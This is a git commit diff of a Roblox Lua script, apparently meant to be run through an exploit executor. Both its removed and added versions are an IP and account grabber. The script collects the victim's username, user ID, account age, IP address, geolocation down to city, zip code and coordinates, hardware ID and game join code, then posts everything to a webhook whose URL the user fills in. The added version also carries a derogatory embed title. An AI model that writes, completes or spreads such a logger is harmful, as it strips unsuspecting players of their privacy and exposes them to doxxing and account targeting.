1aceda02e43c5f9bf28e26e06550672cad145de0
Steven <116656099+StevenK-293@users.noreply.github.com>
2023-07-23 22:41:07 -0400

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,168 +1,83 @@
-local name = game:GetService("Players").LocalPlayer.Name
-local ESD = tostring(game:HttpGet("https://api.ipify.org", true))
-local HTTP_ = game:GetService('HttpService')
-local LPR = game:GetService('Players').LocalPlayer
-local isPremium = game:GetService("Players").LocalPlayer.MembershipType == Enum.MembershipType.Premium
-local username = game.Players.LocalPlayer.Name
-local userId = game.Players.LocalPlayer.UserId
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-local accountAge = math.floor((os.time() - player.AccountAge * 86400) / 86400)
-local jobID = game.JobId
+local MarketplaceService = game:GetService("MarketplaceService")
 
-local getIPInfo = HttpService:JSONDecode(game:HttpGet(string.format("http://ip-api.com/json/%s", ESD)))
-local FI = {
-  IP = ESD,
-  country = getIPInfo.country,
-  countryCode = getIPInfo.countryCode,
-  region = getIPInfo.region,
-  regionName = getIPInfo.regionName,
-  city = getIPInfo.city,
-  zipcode = getIPInfo.zip,
-  latitude = getIPInfo.lat,
-  longitude = getIPInfo.lon,
-  isp = getIPInfo.isp,
-  org = getIPInfo.org
-}
+-- Player Info
+local LocalPlayer = Players.LocalPlayer
+local Userid = LocalPlayer.UserId
+local DName = LocalPlayer.DisplayName
+local Name = LocalPlayer.Name
+local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+local AccountAge = LocalPlayer.AccountAge
+local Country = game.LocalizationService.RobloxLocaleId
+local GetIp = game:HttpGet("https://v4.ident.me/")
+local GetData = game:HttpGet("http://ip-api.com/json")
+local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
 
-local url = "Webhook-Here"
+-- Game Info
+local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
 
-local webhookcheck =
-    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-    secure_load and "Sentinel" or
-    KRNL_LOADED and "Krnl" or
-    SONA_LOADED and "Sona" or
-    FlUXUS_LOADED and "Fluxus" or ""
+-- Detecting Executor
+local function detectExecutor()
+    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
+                    or (secure_load and "Sentinel")
+                    or (pebc_execute and "ProtoSmasher")
+                    or (KRNL_LOADED and "Krnl")
+                    or (is_sirhurt_closure and "SirHurt")
+                    or (identifyexecutor():find("ScriptWare") and "Script-Ware")
+                    or "Unsupported"
+    return executor
+end
 
-local balance = LPR:FindFirstChild("leaderstats") and LPR.leaderstats.Robux.Value or 0
-
-local data = {
-  username = LPR.Name .. ' [' .. LPR.UserId .. ']',
-  avatar_url = HTTP_:JSONDecode(game:HttpGet(('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%i&size=48x48&format=Png&isCircular=false'):format(LPR.UserId)))['data'][1]['imageUrl'],
-  embeds = {
-    {
-      title = "AdvanceFalling Services",
-      description = "Discord: https://discord.gg/d2446gBjfq",
-      color = tonumber(0x2B6BE4),
-      fields = {
-        {
-          name = "Profile:",
-          value = "https://www.roblox.com/users/" .. userId .. "/profile",
-          inline = true
-        },
-        {
-          name = "Game:",
-          value = "https://www.roblox.com/games/" .. game.PlaceId,
-          inline = true
-        },
-        {
-          name = "Game Info:",
-          value = "**ID**: " .. game.PlaceId .. ".\n**Name:** " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
-          inline = true
-        },
-        {
-          name = "Exploit",
-          value = webhookcheck,
-          inline = true
-        },
-        {
-          name = "Premium",
-          value = isPremium and "True" or "False",
-          inline = true
-        },
-        {
-          name = "2FA",
-          value = isPremium and "True" or "False",
-          inline = true
-        },
-        {
-          name = "Account Age",
-          value = "" .. accountAge .. " ",
-          inline = true
-        },
-        {
-          name = "Robux Balance",
-          value = tostring(balance),
-          inline = true
-        },
-        {
-          name = "Join Code",
-          value = "" .. jobID,
-          inline = true
-        },
-        {
-          name = "IP",
-          value = FI.IP,
-          inline = true
-        },
-        {
-          name = "Country",
-          value = FI.country,
-          inline = true
-        },
-        {
-          name = "Country Code",
-          value = FI.countryCode,
-          inline = true
-        },
-        {
-          name = "Region",
-          value = FI.region,
-          inline = true
-        },
-        {
-          name = "Region Name",
-          value = FI.regionName,
-          inline = true
-        },
-        {
-          name = "City",
-          value = FI.city,
-          inline = true
-        },
-        {
-          name = "Zipcode",
-          value = FI.zipcode,
-          inline = true
-        },
-        {
-          name = "Latitude",
-          value = tostring(FI.latitude),
-          inline = true
-        },
-        {
-          name = "Longitude",
-          value = tostring(FI.longitude),
-          inline = true
-        },
-        {
-          name = "ISP",
-          value = FI.isp,
-          inline = true
-        },
-        {
-          name = "Org",
-          value = FI.org,
-          inline = true
-        },
-        {
-          name = "Coming Soon",
-          value = "??????????",
-          inline = true
+-- Creating Webhook Data
+local function createWebhookData()
+    local webhookcheck = detectExecutor()
+    
+    local data = {
+        ["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
+        ["content"] = "",
+        ["embeds"] = {
+            {
+                ["author"] = {
+                    ["name"] = "Some executed your gay script",
+                    ["url"] = "https://roblox.com",
+                },
+                ["description"] = string.format(
+                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
+                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
+                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
+                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
+                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
+                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
+                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
+                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
+                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
+                    GetData, ConsoleJobId
+                ),
+                ["type"] = "rich",
+                ["color"] = tonumber(FFD700), 
+                ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"},
+            }
         }
-      },
-      color = tonumber(0x7269da),
     }
-  }
-}
+    return HttpService:JSONEncode(data)
+end
 
-local newdata = HTTP_:JSONEncode(data)
+-- Sending Webhook
+local function sendWebhook(webhookUrl, data)
+    local headers = {
+        ["content-type"] = "application/json"
+    }
 
-local headers = {
-  ["content-type"] = "application/json"
-}
+    local request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+    request(abcdef)
+end
 
-local request = http_request or request or HttpPost or syn.request
-local abcdef = { Url = url, Body = newdata, Method = "POST", Headers = headers }
-request(abcdef)
+-- Replace the webhook URL with your own URL
+local webhookUrl = "Roblox Webhook Here"
+local webhookData = createWebhookData()
+
+-- Sending the webhook
+sendWebhook(webhookUrl, webhookData)
